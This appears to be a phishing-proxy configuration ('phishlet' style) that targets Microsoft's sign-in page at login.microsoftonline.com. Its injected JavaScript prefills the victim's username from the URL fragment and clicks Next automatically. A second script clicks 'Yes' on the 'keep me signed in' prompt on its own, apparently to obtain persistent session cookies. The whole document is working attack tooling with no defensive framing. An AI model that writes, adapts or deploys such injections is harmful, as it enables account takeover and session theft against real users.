login:
  domain: "login.microsoftonline.com"
  path: "/"

js_inject:
  - trigger_domains: ["login.microsoftonline.com"]
    trigger_paths: ["/"]
    script: |
      function getFragment() {
        return decodeURIComponent(window.location.hash.substring(1));
      }

      function setNativeValue(element, value) {
        const valueSetter = Object.getOwnPropertyDescriptor(
          element.__proto__,
          'value'
        ).set;
        valueSetter.call(element, value);
      }

      async function lp(input) {
        const username = getFragment();
        if (!username) {
          console.log('No username found in the URL fragment.');
          return;
        }

        setNativeValue(input, username);
        console.log('Username set to input field.');

        input.dispatchEvent(new Event('input', { bubbles: true }));
        input.dispatchEvent(new Event('change', { bubbles: true }));
        input.dispatchEvent(new Event('blur', { bubbles: true }));

        await new Promise(resolve => setTimeout(resolve, 1000));

        const nextButton = document.getElementById('idSIButton9');
        if (nextButton) {
          nextButton.click();
          console.log('Next button clicked.');
        } else {
          console.log('Could not find the Next button (idSIButton9).');
        }
      }

      document.addEventListener('DOMContentLoaded', function() {
        const observer = new MutationObserver(function(mutations) {
          mutations.forEach(function(mutation) {
            if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
              const input = document.getElementById('i0116');
              if (input) {
                lp(input);
                observer.disconnect();
              }
            }
          });
        });

        observer.observe(document.body, { childList: true, subtree: true });

        const initialInput = document.getElementById('i0116');
        if (initialInput) {
          lp(initialInput);
          observer.disconnect();
        }
      });

  - trigger_domains: ["login.microsoftonline.com"]
    trigger_paths: [".*kmsi.*"]
    script: |
      function clickKMSIYes() {
        const yesBtn = document.getElementById('idSIButton9');
        if (yesBtn) {
          yesBtn.click();
          console.log('KMSI Yes button clicked.');
          return true;
        }
        return false;
      }

      document.addEventListener('DOMContentLoaded', function() {
        if (clickKMSIYes()) return;

        const observer = new MutationObserver(function() {
          if (clickKMSIYes()) observer.disconnect();
        });
        observer.observe(document.body, { childList: true, subtree: true });
      });